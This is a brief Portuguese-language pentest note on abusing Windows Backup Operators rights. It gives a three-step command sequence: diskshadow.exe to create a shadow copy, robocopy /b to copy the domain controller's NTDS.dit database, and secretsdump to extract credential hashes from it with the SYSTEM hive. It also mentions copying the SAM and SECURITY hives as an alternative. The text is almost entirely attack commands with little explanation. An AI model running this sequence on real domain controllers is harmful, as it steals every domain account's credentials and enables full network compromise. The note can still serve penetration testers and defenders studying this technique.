# Backup Operators (montando unidade lógica para copiar arquivos)

Posso montar a unidade lógica para depois copiar o ntds e descarregá-lo para fazer o dump com o sistema.

``` diskshadow.exe /s c:\Temp\test.txt``` 

> É importante sempre deixar um espaço antes do salto de linha no txt.

Logo podemos mover o arquivo ntds.dt
``` robocopy /b C:\Windows\NTDS . ntds.dit```

Dump de credenciais
```secretsdump -ntds ntds.dit -system system local```
> Também poderia ser copiar o sistema SAM e a segurança, mas às vezes a segurança não permite.
